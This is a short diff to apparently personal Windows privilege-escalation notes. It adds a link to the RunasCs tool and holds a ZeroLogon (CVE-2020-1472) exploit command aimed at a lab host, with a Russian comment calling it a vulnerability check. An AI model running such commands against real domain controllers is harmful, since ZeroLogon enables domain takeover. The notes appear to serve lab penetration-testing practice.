@@ -1,5 +1,9 @@
 # Up_windows
 
+# Run AS without terminal
+
+https://github.com/antonioCoco/RunasCs
+
 # ZERO_LOGON
 
 python3 cve-2020-1472-exploit.py fuse 10.10.10.193 (проверка на уязвимость)
